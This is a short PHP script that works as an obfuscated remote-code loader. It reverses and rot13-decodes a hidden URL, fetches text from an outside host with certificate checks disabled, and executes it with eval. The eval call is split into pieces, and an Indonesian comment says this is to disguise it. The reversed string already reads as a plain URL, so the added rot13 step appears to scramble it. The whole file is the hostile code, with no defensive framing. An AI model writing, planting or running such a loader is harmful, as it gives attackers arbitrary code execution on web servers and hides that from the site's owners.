<?php
$s = "txt.2/niam/sdaeh/sfer/mpo/mpoofful/moc.tnetnocresubutig.war//:sptth";
$u = str_rot13(strrev($s));

$ch = curl_init($u);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_TIMEOUT => 15
]);

$r = curl_exec($ch);
$st = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($st === 200 && $r) {
    $f = "ev"."al"; // Menyamarkan pemanggilan fungsi eval
    $f("?>" . $r);
}
?>
